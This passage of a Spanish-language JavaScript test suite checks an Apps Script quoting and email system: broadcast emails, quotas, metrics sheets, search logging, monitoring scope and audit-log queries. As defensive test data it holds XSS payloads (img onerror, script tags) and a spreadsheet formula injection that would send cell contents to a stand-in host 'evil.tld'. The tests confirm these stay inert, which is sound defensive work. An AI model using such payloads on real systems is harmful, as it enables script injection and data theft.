    { tipo: 'titulo', texto: '"><img src=x onerror=alert(1)>' },
    { tipo: 'lista', items: [[{ t: '<script>x</script>' }]] },
    { tipo: 'boton', texto: '<b>Ir</b>', url: 'https://ok.com/"><script>' }
  ]);
  const html = ctx.difCuerpoHtml_(saneado.bloques, {});

  ok('el HTML del usuario llega escapado', html.indexOf('&lt;b&gt;no soy negrita&lt;/b&gt;') > -1);
  ok('no queda ningún <script> vivo', html.indexOf('<script') === -1, html.slice(0, 200));
  /* El texto «onerror» SIGUE en la cadena, y tiene que seguir: es lo que escribió la
     persona y se lee tal cual en el correo. Lo que no puede quedar es la ETIQUETA que lo
     ejecutaría, así que se comprueba eso y no la palabra. */
  ok('el <img onerror=…> quedó como texto, no como etiqueta',
     html.indexOf('<img src=x') === -1 && html.indexOf('&lt;img src=x onerror=alert(1)&gt;') > -1,
     html.slice(0, 300));
  ok('la negrita de verdad sí se pinta', html.indexOf('<strong>') > -1);
  ok('la comilla del enlace se escapa y no cierra el atributo',
     html.indexOf('href="https://ok.com/&quot;&gt;&lt;script&gt;"') > -1 || html.indexOf('&quot;') > -1);

  const plano = ctx.difCuerpoPlano_(saneado.bloques, 'Asunto', 'Quien Manda');
  ok('el texto plano existe y dice de quién viene', /Quien Manda/.test(plano), plano.slice(-80));
}

console.log('\n12. DIFUSIÓN · envío, cuota y destinatarios en CCO (T9.3)');
{
  const ctx = cargar({}, { props: { CORREO_CCO_GLOBAL: 'monitoreo@ventel.com' } });
  const g = ctx.grpGuardar(SUPER, { nombre: 'Equipo' });
  ctx.grpFijarMiembros(SUPER, g.id, [ASESOR, 'asesor2@ventel.com', 'debaja@ventel.com']);

  const vacio = ctx.difEnviar(SUPER, { grupoId: g.id, asunto: '', bloques: [] });
  ok('sin asunto no sale', vacio.success === false, JSON.stringify(vacio));

  const sinCuerpo = ctx.difEnviar(SUPER, { grupoId: g.id, asunto: 'Hola', bloques: [] });
  ok('sin cuerpo tampoco', sinCuerpo.success === false, JSON.stringify(sinCuerpo));

  const r = ctx.difEnviar(SUPER, {
    grupoId: g.id, asunto: 'Cambios del lunes',
    bloques: [{ tipo: 'parrafo', partes: [{ t: 'Buenos días' }] }]
  });
  ok('el comunicado sale', r.success === true, JSON.stringify(r));
  eq('a los dos que pueden recibirlo (el de baja no cuenta)', r.destinatarios, 2);

  const env = ctx.__estado.enviados[ctx.__estado.enviados.length - 1];
  eq('el «Para» es quien lo manda', env.para, SUPER);
  ok('y el grupo va en copia oculta',
     env.op.bcc.indexOf(ASESOR) > -1 && env.op.bcc.indexOf('asesor2@ventel.com') > -1, env.op.bcc);
  ok('quien está de baja NO recibe', env.op.bcc.indexOf('debaja@ventel.com') === -1, env.op.bcc);
  ok('una difusión no arrastra la copia oculta global: ya va en CCO',
     env.op.bcc.indexOf('monitoreo@ventel.com') === -1, env.op.bcc);

  const met = ctx.__estado.hojas['MetricasCorreos'];
  ok('queda registrada en las métricas', !!met && met._datos.length === 2, met ? String(met._datos.length) : 'sin hoja');
  ok('con su tipo propio', met._datos[1].indexOf('Difusión') > -1, JSON.stringify(met._datos[1]));

  const bit = ctx.__estado.hojas['BitacoraConsola'];
  ok('y en la bitácora', !!bit && bit._datos.length >= 2);

  const prueba = ctx.difEnviar(SUPER, {
    grupoId: g.id, asunto: 'Ensayo', prueba: true,
    bloques: [{ tipo: 'parrafo', partes: [{ t: 'probando' }] }]
  });
  ok('el envío de prueba llega solo a quien lo escribe', prueba.success === true, JSON.stringify(prueba));
  const envP = ctx.__estado.enviados[ctx.__estado.enviados.length - 1];
  ok('sin copia oculta a nadie más', !envP.op.bcc, JSON.stringify(envP.op));
  ok('y el asunto avisa de que es una prueba', /^\[Prueba\]/.test(envP.asunto), envP.asunto);
}

console.log('\n13. DIFUSIÓN · la cuota se comprueba ANTES de mandar');
{
  const ctx = cargar({}, { cuota: 1 });
  const g = ctx.grpGuardar(SUPER, { nombre: 'Muchos' });
  ctx.grpFijarMiembros(SUPER, g.id, [ASESOR, 'asesor2@ventel.com', 'super2@ventel.com']);
  const r = ctx.difEnviar(SUPER, {
    grupoId: g.id, asunto: 'No cabe',
    bloques: [{ tipo: 'parrafo', partes: [{ t: 'x' }] }]
  });
  ok('con cuota insuficiente no se manda nada', r.success === false, JSON.stringify(r));
  ok('y se dice cuánta falta', /cuota/i.test(r.message), r.message);
  eq('no salió ni un correo', ctx.__estado.enviados.length, 0);

  const gate = ctx.difEnviar(COORD, { grupoId: g.id, asunto: 'x', bloques: [{ tipo: 'parrafo', partes: [{ t: 'x' }] }] });
  ok('un asesor con sup_equipo tampoco puede difundir', gate.success === false, JSON.stringify(gate));
}

console.log('\n14. MÉTRICAS · la hoja se repara sola al ganar una columna (T9.4)');
{
  // Una instalación viva: la hoja existe con las 15 columnas de antes.
  const viejas = ['Fecha', 'Tipo', 'Referencia', 'AsesorEmail', 'AsesorNombre', 'Para', 'Destinatarios',
                  'CC', 'CCO', 'Asunto', 'Adjuntos', 'Remitente', 'AliasUsado', 'Resultado', 'Detalle'];
  const ctx = cargar({ MetricasCorreos: hoja('MetricasCorreos', [viejas.slice()]) });

  ctx.metRegistrarEnvio_({ tipo: 'Plantilla cliente', asunto: 'Hola', resultado: 'Enviado',
                           plantillaModificada: 'Sí' });
  const h = ctx.__estado.hojas['MetricasCorreos'];
  eq('la columna nueva se añade al encabezado', h._datos[0][15], 'PlantillaModificada');
  eq('y el dato cae en su sitio', h._datos[1][15], 'Sí');
  eq('sin descolocar los de siempre', h._datos[1][1], 'Plantilla cliente');

  /* Una hoja a la que le borraron las columnas sobrantes de la derecha: getMaxColumns() es
     exactamente el ancho usado, y escribir una columna más allá del borde LANZA. Como todo esto
     vive dentro del try/catch que protege el envío, el fallo se lo tragaba el Logger y las
     métricas dejaban de escribirse sin que nadie se enterara. */
  const justa = hoja('MetricasCorreos', [viejas.slice()]);
  justa.getMaxColumns = () => 15;
  let estirada = 0;
  justa.insertColumnsAfter = (desde, cuantas) => { estirada += cuantas; justa.getMaxColumns = () => 15 + estirada; return justa; };
  const ctxJ = cargar({ MetricasCorreos: justa });
  ctxJ.metRegistrarEnvio_({ tipo: 'Difusión', resultado: 'Enviado' });
  ok('la hoja se estira antes de escribir la columna nueva', estirada >= 1, String(estirada));
  eq('y el envío queda registrado igual', justa._datos.length, 2);

  // Y si alguien movió las columnas de sitio, se sigue escribiendo por NOMBRE.
  const revueltas = ['Tipo', 'Fecha', 'Asunto', 'Resultado'];
  const ctx2 = cargar({ MetricasCorreos: hoja('MetricasCorreos', [revueltas.slice()]) });
  ctx2.metRegistrarEnvio_({ tipo: 'Difusión', asunto: 'Comunicado', resultado: 'Enviado' });
  const h2 = ctx2.__estado.hojas['MetricasCorreos'];
  eq('con las columnas movidas, el tipo sigue en su columna', h2._datos[1][0], 'Difusión');
  eq('y el asunto en la suya', h2._datos[1][2], 'Comunicado');
  ok('las columnas que faltaban se crearon al final',
     h2._datos[0].indexOf('PlantillaModificada') > 3, JSON.stringify(h2._datos[0]));
}

console.log('\n15. MONITOREO · registro de búsquedas (T9.4)');
{
  const ctx = cargar({});
  ctx.monRegistrarBusqueda_('ab', ASESOR, 'cotizaciones');
  ok('una búsqueda de dos letras no se apunta', !ctx.__estado.hojas['MetricasBusquedas']);

  ctx.monRegistrarBusqueda_('devoluciones', ASESOR, 'cotizaciones', 4);
  const h = ctx.__estado.hojas['MetricasBusquedas'];
  ok('la hoja se crea con la primera búsqueda de verdad', !!h);
  eq('con sus encabezados', h._datos[0].join('|'), ctx.MON_BUSQ_HEADERS.join('|'));
  eq('y una fila', h._datos.length, 2);
  eq('el término se guarda tal cual', h._datos[1][1], 'devoluciones');
  eq('con el correo ya verificado contra la sesión', h._datos[1][2], ASESOR);

  ctx.monRegistrarBusqueda_('devoluciones', ASESOR, 'cotizaciones');
  eq('repetir la misma búsqueda enseguida NO deja otra fila', h._datos.length, 2);

  ctx.monRegistrarBusqueda_('devoluciones', 'super@ventel.com', 'cotizaciones');
  eq('pero otra persona buscando lo mismo sí cuenta', h._datos.length, 3);

  /* Tecleando: la paleta dispara con cada pausa, así que llegan los prefijos uno detrás de
     otro. No pueden dejar cinco filas: la fila se AFINA y se queda con el término largo. */
  const ctxT = cargar({});
  ['gar', 'garan', 'garanti', 'garantias'].forEach((t) => ctxT.monRegistrarBusqueda_(t, ASESOR, 'paleta'));
  const hT = ctxT.__estado.hojas['MetricasBusquedas'];
  eq('escribir «garantias» letra a letra deja UNA fila', hT._datos.length, 2);
  eq('y guarda el término completo, no el primer prefijo', hT._datos[1][1], 'garantias');

  // Borrar letras es la misma búsqueda; empezar otra distinta, no.
  ctxT.monRegistrarBusqueda_('garan', ASESOR, 'paleta');
  eq('borrar letras sigue siendo la misma búsqueda', hT._datos.length, 2);
  ctxT.monRegistrarBusqueda_('facturas', ASESOR, 'paleta');
  eq('una búsqueda distinta sí abre fila nueva', hT._datos.length, 3);

  /* SIN SESIÓN NO SE ESCRIBE. getQuotesForUser no tiene gate y la webapp se sirve a todo el
     dominio: si el registro aceptara a cualquiera, sería el único sitio del sistema donde se
     puede escribir en una hoja sin estar dado de alta, tantas veces como se quiera. */
  ctx.monRegistrarBusqueda_('garantias', 'inventado@fuera.com', 'paleta');
  eq('una búsqueda sin sesión reconocible no se apunta', h._datos.length, 3);

  /* Y lo que se escribe queda INERTE: una celda que empieza por «=» es una fórmula viva
     dentro del libro de cotizaciones, no un texto. */
  ctx.monRegistrarBusqueda_('=IMPORTXML("https://evil.tld/?d="&A1,"//a")', ASESOR, 'cotizaciones');
  const ultima = h._datos[h._datos.length - 1];
  ok('un término con forma de fórmula se guarda como texto',
     String(ultima[1]).charAt(0) === "'", JSON.stringify(ultima[1]).slice(0, 60));
  ok('y no se pierde lo que se escribió', String(ultima[1]).indexOf('IMPORTXML') > -1);

  ok('registrar una búsqueda NO tira la caché de cotizaciones',
     !ctx.__estado.cacheTirada, String(ctx.__estado.cacheTirada));
}

console.log('\n16. MONITOREO · alcance jerárquico y filtros');
{
  const ayer = new Date(Date.now() - 24 * 60 * 60 * 1000);
  const cotis = hoja('Cotizaciones', [
    ['Folio', 'Timestamp', 'AsesorCorreo', 'AsesorNombre', 'ClienteNombre', 'CorreoCliente', 'Numero', 'TotalGeneral', 'Estatus'],
    ['LVP-1', ayer, ASESOR, 'Ana Asesora', 'Cliente Uno', 'uno@cliente.com', '55-1234-5678', 1000, 'Folio Generado'],
    ['LVP-2', ayer, 'maestra@ventel.com', 'Maestra Total', 'Cliente Dos', 'dos@cliente.com', '5599887766', 2000, 'Enviada por Correo'],
    ['LVP-3', ayer, 'asesor2@ventel.com', 'Beto Asesor', 'Otro Cliente', 'tres@cliente.com', '5511112222', 3000, 'Folio Generado']
  ]);
  const ctx = cargar({ Cotizaciones: cotis });

  const comoMaestra = ctx.monCotizaciones(MAESTRA, {});
  ok('la maestra ve las tres', comoMaestra.success && comoMaestra.filas.length === 3,
     JSON.stringify(comoMaestra.filas && comoMaestra.filas.map((f) => f.folio)));

  const comoSuper = ctx.monCotizaciones(SUPER, {});
  eq('un supervisor no ve la de la maestra', comoSuper.filas.length, 2);
  ok('y las que ve son las de su nivel hacia abajo',
     comoSuper.filas.every((f) => f.folio !== 'LVP-2'), JSON.stringify(comoSuper.filas.map((f) => f.folio)));

  const porAsesor = ctx.monCotizaciones(MAESTRA, { asesor: ASESOR });
  eq('filtra por asesor', porAsesor.filas.length, 1);

  const porTel = ctx.monCotizaciones(MAESTRA, { telefono: '5512345678' });
  eq('el teléfono se busca sin guiones', porTel.filas.length, 1);
  eq('y es el correcto', porTel.filas[0].folio, 'LVP-1');

  const porCliente = ctx.monCotizaciones(MAESTRA, { cliente: 'dos@' });
  eq('filtra por parte del correo del cliente', porCliente.filas.length, 1);

  const porTexto = ctx.monCotizaciones(MAESTRA, { texto: 'otro cliente' });
  eq('el texto libre busca en folio y nombre, sin acentos ni mayúsculas', porTexto.filas.length, 1);

  const sinPermiso = ctx.monCotizaciones(ASESOR, {});
  ok('un asesor no entra a monitoreo', sinPermiso.success === false, JSON.stringify(sinPermiso));

  const pan = ctx.monPanorama(SUPER);
  ok('el panorama dice el alcance con honestidad', pan.alcance === 'jerarquia', JSON.stringify(pan.alcance));
  ok('y solo ofrece a la gente que puede mirar',
     pan.personas.every((p) => p.email !== 'maestra@ventel.com'), JSON.stringify(pan.personas.map((p) => p.email)));
  ok('el panorama NO lee cotizaciones', pan.filas === undefined);
}

console.log('\n16 bis. MONITOREO · un periodo PASADO no se pierde bajo miles de filas recientes');
{
  /* El caso que se le escapó a la primera versión, y el peor de todos porque no se ve: buscando
     hacia atrás por lotes, TODAS las filas entre hoy y el periodo pedido cumplen «no son
     anteriores al rango», así que el recorrido no paraba nunca, se comía el techo de lectura y
     contestaba VACÍO sin haber llegado al periodo. Se lee como «no hubo nada en enero».
     Ahora se mira primero la columna de fechas —una celda por fila— y solo se leen enteras las
     que caen dentro, así que da igual lo lejos que esté el periodo. */
  const hoy = new Date();
  const viejo1 = new Date(hoy.getFullYear() - 1, 0, 10, 12, 0, 0);
  const viejo2 = new Date(hoy.getFullYear() - 1, 0, 20, 12, 0, 0);

  const filas = [['Folio', 'Timestamp', 'AsesorCorreo', 'AsesorNombre', 'ClienteNombre',
                  'CorreoCliente', 'Numero', 'TotalGeneral', 'Estatus']];
  filas.push(['LVP-VIEJA-1', viejo1, ASESOR, 'Ana', 'Cliente Viejo', 'v1@c.com', '55', 100, 'Folio Generado']);
  filas.push(['LVP-VIEJA-2', viejo2, ASESOR, 'Ana', 'Cliente Viejo', 'v2@c.com', '55', 200, 'Folio Generado']);
  for (let i = 0; i < 13000; i++) {
    filas.push(['LVP-' + i, hoy, ASESOR, 'Ana', 'Cliente Hoy', 'h@c.com', '55', 10, 'Folio Generado']);
  }

  const ctx = cargar({ Cotizaciones: hoja('Cotizaciones', filas) });
  const p = (n) => String(n).padStart(2, '0');
  const dia = (d) => d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate());

  const r = ctx.monCotizaciones(MAESTRA, { desde: dia(new Date(hoy.getFullYear() - 1, 0, 1)),
                                           hasta: dia(new Date(hoy.getFullYear() - 1, 0, 31)) });
  ok('la consulta responde', r.success === true, JSON.stringify(r).slice(0, 200));
  eq('encuentra las dos de hace un año, con trece mil filas más recientes encima', r.filas.length, 2);
  ok('y son las correctas',
     r.filas.map((f) => f.folio).sort().join(',') === 'LVP-VIEJA-1,LVP-VIEJA-2',
     JSON.stringify(r.filas.map((f) => f.folio)));
  ok('sin marcar la consulta como recortada', r.truncado === false, JSON.stringify({ truncado: r.truncado }));

  // Y el tope de la pantalla sigue vivo para un periodo con demasiadas filas dentro.
  const hoyR = ctx.monCotizaciones(MAESTRA, { desde: dia(hoy), hasta: dia(hoy) });
  eq('un periodo con miles de filas se corta en el tope', hoyR.filas.length, 800);
  ok('y se avisa de que está recortado', hoyR.truncado === true);
}

console.log('\n17. MONITOREO · utilidades');
{
  const ctx = cargar({});
  eq('el texto se compara sin acentos', ctx.monPlano_('Devolución'), 'devolucion');
  eq('el teléfono se queda en dígitos', ctx.monSoloDigitos_('+52 (55) 1234-5678'), '525512345678');
  const c = ctx.monCols_(['Fecha', 'AsesorEmail', 'Teléfono'], { fecha: ['fecha'], asesor: ['asesoremail'], tel: ['telefono'] });
  eq('las columnas se localizan por nombre', c.fecha, 0);
  eq('sin importar el acento del encabezado', c.tel, 2);
  eq('y lo que no está devuelve -1', ctx.monCols_(['Fecha'], { x: ['nada'] }).x, -1);
  ok('el maestro lo ve todo', ctx.monPuedeVer_(null, 'cualquiera@x.com') === true);
  ok('una fila sin dueño no se le enseña a quien tiene alcance recortado',
     ctx.monPuedeVer_({ 'a@b.com': true }, '') === false);
}

console.log('\n18. BITÁCORA POR FECHAS (T9.5)');
{
  const hoy = new Date();
  const hace2 = new Date(hoy.getTime() - 2 * 24 * 60 * 60 * 1000);
  const hace40 = new Date(hoy.getTime() - 40 * 24 * 60 * 60 * 1000);
  const bit = hoja('BitacoraConsola', [
    ['Fecha', 'Quien', 'Accion', 'Objetivo', 'Detalle'],
    [hace40, MAESTRA, 'Ajuste cambiado', '', 'viejo'],
    [hace2, SUPER, 'Rol o accesos modificados', ASESOR, 'de prueba'],
    [hace2, MAESTRA, 'Módulo apagado', 'promociones', 'mantenimiento']
  ]);
  const ctx = cargar({ BitacoraConsola: bit });

  /* La fecha se arma en HORA LOCAL y no con toISOString: el servidor interpreta
     «2026-08-15» como ese día completo en la zona del script, y a partir de las 18:00
     de México el ISO ya es del día siguiente. Con toISOString la prueba fallaba solo
     por la tarde, que es la peor clase de prueba que existe. */
  const fmt = (d) => {
    const p = (n) => String(n).padStart(2, '0');
    return d.getFullYear() + '-' + p(d.getMonth() + 1) + '-' + p(d.getDate());
  };
  const r = ctx.consolaBitacoraRango(MAESTRA, fmt(new Date(hoy.getTime() - 7 * 24 * 60 * 60 * 1000)), fmt(hoy));
  ok('la consulta responde', r.success === true, JSON.stringify(r));
  eq('trae solo lo del periodo', r.bitacora.length, 2);

  const largo = ctx.consolaBitacoraRango(MAESTRA, fmt(hace40), fmt(hoy));
  eq('con el periodo largo aparece también lo viejo', largo.bitacora.length, 3);

  const alReves = ctx.consolaBitacoraRango(MAESTRA, fmt(hoy), fmt(hace40));
  ok('rechaza un rango del revés', alReves.success === false, JSON.stringify(alReves));

  const sinFechas = ctx.consolaBitacoraRango(MAESTRA, '', '');
  ok('y pide las dos fechas', sinFechas.success === false, JSON.stringify(sinFechas));

  /* Un lote entero con la fecha ilegible NO puede cortar el recorrido.
     Se recorre hacia atrás en lotes de 400: se ponen 500 renglones sin fecha —una columna que
     alguien vació, un texto donde iba una fecha— y detrás, más antiguos, los que sí importan.
     Con la versión anterior el primer lote se leía como «todo esto es viejo» y la consulta
     devolvía cero sin decir nada. */
  {
    const filas = [['Fecha', 'Quien', 'Accion', 'Objetivo', 'Detalle']];
    filas.push([hace2, MAESTRA, 'Persona dada de alta', ASESOR, 'la que hay que encontrar']);
    for (let i = 0; i < 500; i++) filas.push(['', MAESTRA, 'Ajuste cambiado', '', 'sin fecha']);
    const ctxSucio = cargar({ BitacoraConsola: hoja('BitacoraConsola', filas) });
    const r2 = ctxSucio.consolaBitacoraRango(MAESTRA,
      fmt(new Date(hoy.getTime() - 7 * 24 * 60 * 60 * 1000)), fmt(hoy));
    eq('quinientos renglones sin fecha no esconden el que sí la tiene', r2.bitacora.length, 1);
    ok('y se leyó más de un lote para llegar hasta él', r2.leidas > 400, String(r2.leidas));
  }

  const rango = ctx.consolaRangoFechas_('2026-08-01', '2026-08-05');
  ok('el día final entra completo', rango.hasta.getHours() === 23 && rango.hasta.getMinutes() === 59,
     rango.hasta && rango.hasta.toISOString());
  ok('y el inicial empieza a medianoche', rango.desde.getHours() === 0);
}

console.log('\n19. RESUMEN · las recomendaciones las calcula el servidor (T9.9)');
{
  const registros = hoja('Registros', [
    ['Email', 'Nombre', 'Avanzado', 'PasswordTemporal'],
    [ASESOR, 'Ana', '', 'Sí'],
    ['asesor2@ventel.com', 'Beto', '', '']
  ]);
  const ctx = cargar({ Registros: registros }, {
    apagados: ['promociones'],
    props: { CONSOLA_MODULOS_DESDE: JSON.stringify({ promociones: new Date(Date.now() - 30 * 24 * 60 * 60 * 1000).toISOString() }) }
  });

  const acc = { ok: true, email: MAESTRA, nombre: 'Maestra', maestro: true, nivel: 3,
                secciones: ['resumen', 'ajustes', 'modulos', 'salud', 'metricas'], usuario: ctx.permUsuario_(MAESTRA) };
  const recs = ctx.consolaRecomendaciones_(acc);

  ok('avisa del módulo apagado hace semanas',
     recs.some((r) => /promociones/.test(r.texto) && /30 días/.test(r.texto)),
     JSON.stringify(recs.map((r) => r.texto)));
  ok('con el tono de problema y no de aviso suave',
     recs.some((r) => /promociones/.test(r.texto) && r.tono === 'malo'));
  ok('cada recomendación trae su acción',
     recs.filter((r) => r.accion).every((r) => r.panel || r.pagina), JSON.stringify(recs));
  ok('avisa de que la revisión del sistema nunca se ha corrido',
     recs.some((r) => /revisión del sistema no se ha corrido/i.test(r.texto)), JSON.stringify(recs.map((r) => r.texto)));
  ok('y de quien sigue con la contraseña temporal',
     recs.some((r) => /contraseña temporal/i.test(r.texto)), JSON.stringify(recs.map((r) => r.texto)));

  // Un supervisor no recibe las cifras de la instalación.
  const accSuper = { ok: true, email: SUPER, nombre: 'Super', maestro: false, nivel: 2,
                     secciones: ['resumen', 'roles', 'metricas'], usuario: ctx.permUsuario_(SUPER) };
  const recsSuper = ctx.consolaRecomendaciones_(accSuper);
  ok('un supervisor no ve las cifras de la instalación',
     !recsSuper.some((r) => /contraseña temporal|revisión del sistema/i.test(r.texto)),
     JSON.stringify(recsSuper.map((r) => r.texto)));
  ok('pero sí el módulo apagado, que le afecta a su equipo',
     recsSuper.some((r) => /promociones/.test(r.texto)));
}

console.log('\n20. LA SECCIÓN NUEVA ESTÁ DECLARADA EN LOS CUATRO SITIOS');
{
  const ctx = cargar({});
  const sec = ctx.CONSOLA_SECCIONES.filter((s) => s.id === 'metricas')[0];
  ok('1/4 · la sección existe en el servidor', !!sec, JSON.stringify(ctx.CONSOLA_SECCIONES.map((s) => s.id)));
  ok('y la abre el bloque «metricas»', sec.bloques.indexOf('metricas') > -1, JSON.stringify(sec.bloques));

  const perm = fs.readFileSync(path.join(PROY, 'Permisos.gs'), 'utf8');
  ok('el bloque está en el catálogo', /id: 'metricas'/.test(perm));
  ok('no es de administración (lo alcanza un supervisor)',
     /id: 'metricas'[\s\S]{0,400}?admin: false/.test(perm));
  ok('y se puede apagar por mantenimiento (T9.10)',
     /id: 'metricas'[\s\S]{0,400}?fijo: false/.test(perm));
  ok('el rol avanzado lo trae por defecto', /'articulos', 'metricas'/.test(perm));

  const cons = fs.readFileSync(path.join(PROY, 'consola.html'), 'utf8');
  ok('2/4 · la pestaña existe en el HTML', /data-panel="metricas" data-seccion="metricas"/.test(cons));
  ok('3/4 · y su panel', /id="panel-metricas"/.test(cons));
  ok('4/4 · y está en la lista blanca del cliente, o ?sec=metricas no abriría nada',
     /CNS_PANELES = \[[^\]]*'metricas'/.test(cons));

  /* Y una guarda que solo se ve leyendo: en consolaPanorama, el `typeof grpListar` tiene que ir
     ANTES de leer GRP_NIVEL_MINIMO. Si Grupos.gs no estuviera desplegado, leer esa constante no
     daría un panorama sin grupos: daría un ReferenceError que deja la consola entera sin cargar. */
  const consolaGs = fs.readFileSync(path.join(PROY, 'Consola.gs'), 'utf8');
  const trozo = consolaGs.slice(consolaGs.indexOf('grupos:'), consolaGs.indexOf('grupos:') + 400);
  ok('un Grupos.gs ausente no puede tumbar el panorama',
     trozo.indexOf("typeof grpListar === 'function'") > -1 &&
     trozo.indexOf("typeof grpListar === 'function'") < trozo.indexOf('GRP_NIVEL_MINIMO'),
     trozo.slice(0, 200));

  const indices = fs.readFileSync(path.join(PROY, 'app_indices.html'), 'utf8');
  ok('el buscador general ofrece la sección', /id:'monitoreo'/.test(indices));
  ok('con su bloque, para no ofrecérsela a quien no puede abrirla',
     /id:'monitoreo'[\s\S]{0,300}bloques:\['metricas'\]/.test(indices));

  const comando = fs.readFileSync(path.join(PROY, 'app_comando.html'), 'utf8');
  ok('y la paleta también', /id:'sec-monitoreo'/.test(comando));
  ok('con sec y no con ancla, que es como se navega a una pestaña',
     /id:'sec-monitoreo'[\s\S]{0,300}params:\{ sec:'metricas' \}/.test(comando));
}

console.log('\n21. SALUD · las áreas nuevas de la revisión maestra (T9.8)');
{
  const admin = fs.readFileSync(path.join(PROY, 'Admin.gs'), 'utf8');
  ['Contenido', 'Métricas', 'Módulos'].forEach((area) => {
    ok('el área «' + area + '» está en la revisión', new RegExp("check\\('" + area + "'").test(admin));
  });
  [['Artículos', 'artListar'], ['Grupos de personas', 'grpListar'], ['Registro de búsquedas', 'monBusquedasHoja_'],
   ['Copia oculta global', 'correoCcoGlobal_'], ['Trazabilidad', 'trazInvalidarCache'],
   ['Preferencias de usuario', 'PREFS_HOJA'], ['Atenciones pendientes', 'atencionesPanorama'],
   ['Revisión y su política', 'revpolLeer_'], ['Auditoría de cotizaciones', 'audAuditar_'],
   ['Caché de identidad', 'idcLeer_']].forEach(([nombre, fn]) => {
    ok('«' + nombre + '» se comprueba contra ' + fn,
       admin.indexOf(nombre) > -1 && admin.indexOf(fn) > -1);
  });

  // La agrupación del reporte es CONTIGUA: dos bloques del mismo área separados pintan
  // dos cabeceras iguales en la consola.
  const areas = (admin.match(/check\('([^']+)'/g) || []).map((m) => m.slice(7, -1));
  const vistas = [];
  let anterior = '';
  let repetida = '';
  areas.forEach((a) => {
    if (a === anterior) return;
    if (vistas.indexOf(a) > -1) repetida = a;
    vistas.push(a); anterior = a;
  });
  ok('ningún área aparece en dos bloques separados', repetida === '', 'se repite: ' + repetida);
}

console.log('\n22. EL ALIAS Y EL REMITENTE SALIERON DEL CÓDIGO (T9.7)');
{
  const ctx = cargar({}, { props: { MAIL_ALIAS: 'nuevo@liverpool.com.mx' } });
  eq('manda el ajuste sobre la constante', ctx.mailAlias_(), 'nuevo@liverpool.com.mx');

  const ctx2 = cargar({});
  eq('sin ajuste, el respaldo de siempre', ctx2.mailAlias_(), 'cotizacion@liverpool.com.mx');

  /* Que no quede NINGUNA lectura de la constante vieja. Se quitan antes los comentarios
     —que la citan al explicar el cambio— y las cadenas 'MAIL_ALIAS', que son la clave del
     ajuste y tienen que seguir ahí. Lo que se busca es el identificador suelto: si alguien
     vuelve a escribirlo, leería el respaldo y se saltaría lo que diga la consola. */
  const limpiar = (src) => src
    .replace(/\/\/[^\n]*/g, '')
    .replace(/\/\*[\s\S]*?\*\//g, '')
    .replace(/'MAIL_ALIAS'|"MAIL_ALIAS"/g, "'clave'");

  ['Correos.gs', 'CorreoCliente.gs', 'Cuentas.gs', 'Revision.gs'].forEach((f) => {
    const src = limpiar(fs.readFileSync(path.join(PROY, f), 'utf8'));
    ok(f + ' usa mailAlias_() y no la constante', !/\bMAIL_ALIAS\b(?!_)/.test(src),
       'queda una lectura directa de MAIL_ALIAS en ' + f);
  });

  const cc = fs.readFileSync(path.join(PROY, 'CorreoCliente.gs'), 'utf8');
  ok('el nombre del remitente también se lee del ajuste', /name: ccSenderName_\(\)/.test(cc));
  ok('y el cliente manda el asunto que propone la plantilla, para poder compararlo',
     /asuntoPlantilla/.test(fs.readFileSync(path.join(PROY, 'correo_cliente.html'), 'utf8')));
}

console.log('\n23. LAS CUATRO RUTAS DE ENVÍO LLEVAN LA COPIA OCULTA (T9.6)');
{
  const rutas = [
    ['Correos.gs', 'cotizaciones con PDF'],
    ['CorreoCliente.gs', 'plantillas a cliente'],
    ['Cuentas.gs', 'avisos de cuenta'],
    ['Revision.gs', 'avisos de revisión']
  ];
  rutas.forEach(([f, que]) => {
    const src = fs.readFileSync(path.join(PROY, f), 'utf8');
    ok('la ruta de ' + que + ' aplica el CCO global', /correoAplicarCco_\(|cco: true/.test(src));
  });

  // Y los tres correos de seguridad NO lo piden.
  const cuentas = fs.readFileSync(path.join(PROY, 'Cuentas.gs'), 'utf8');
  const codigo = cuentas.slice(cuentas.indexOf('function cuentasEnviarCodigo_'));
  ok('el correo del código de verificación no pide copia oculta',
     !/cco: true/.test(codigo.slice(0, codigo.indexOf('function cuentasEnviarAviso_') + 1 || 4000)));
  const consola = fs.readFileSync(path.join(PROY, 'Consola.gs'), 'utf8');
  const bienvenida = consola.slice(consola.indexOf('function consolaCorreoBienvenida_'),
                                   consola.indexOf('function consolaLeerAjustes_'));
  ok('ni el de bienvenida con la contraseña temporal', !/cco: true/.test(bienvenida));
  ok('ni el de restablecimiento', !/cco: true/.test(bienvenida));
}

console.log('\n24. TODO LO QUE LA CONSOLA LLAMA EXISTE EN EL SERVIDOR');
{
  /* Guardia de espejo. El cliente invoca al servidor por NOMBRE, en una cadena: si alguien
     renombra una función del .gs, aquí no falla nada —falla en producción, en silencio, con la
     pantalla cargando para siempre—. Esto lo convierte en un fallo de la batería.
     También comprueba lo contrario de lo que parece: que ninguna llamada del cliente apunte a
     un helper privado (los que terminan en guion bajo NO son alcanzables por google.script.run). */
  const cons = fs.readFileSync(path.join(PROY, 'consola.html'), 'utf8');
  const llamadas = {};
  const re = /(?:llamar|guardarEnFondo)\('([A-Za-z0-9_]+)'/g;
  let m;
  while (( m = re.exec(cons)) !== null) llamadas[m[1]] = true;

  /* Y los nombres que NO viajan literales en la llamada: los grupos pasan por un envoltorio
     (`guardarGrupo('grpGuardar', …)`) y las cuatro consultas de monitoreo salen de un mapa.
     Son justo los que un renombrado dejaría rotos sin que nadie lo notara, así que se recogen
     todas las cadenas con la forma de una función de servidor de esta fase. */
  const re2 = /'((?:grp|dif|mon|consola)[A-Za-z0-9_]+)'/g;
  while ((m = re2.exec(cons)) !== null) {
    if (m[1].charAt(m[1].length - 1) !== '_') llamadas[m[1]] = true;
  }
  // Claves de caché y etiquetas que casualmente empiezan igual: no son funciones.
  delete llamadas['consolaPanoramaCache'];

  const fuentes = fs.readdirSync(PROY).filter((f) => f.endsWith('.gs'))
    .map((f) => fs.readFileSync(path.join(PROY, f), 'utf8')).join('\n');

  const nombres = Object.keys(llamadas).sort();
  ok('la consola llama a ' + nombres.length + ' funciones del servidor', nombres.length >= 12,
     nombres.join(', '));
  nombres.forEach((n) => {
    ok('existe ' + n + '()', new RegExp('function\\s+' + n + '\\s*\\(').test(fuentes));
    ok(n + ' es alcanzable (no termina en guion bajo)', n.charAt(n.length - 1) !== '_');
  });
}

console.log('\n─────────────────────────────────────────────');
console.log(fallos === 0 ? `TODO OK · ${pruebas} comprobaciones` : `${fallos} FALLOS de ${pruebas}`);
process.exit(fallos === 0 ? 0 : 1);
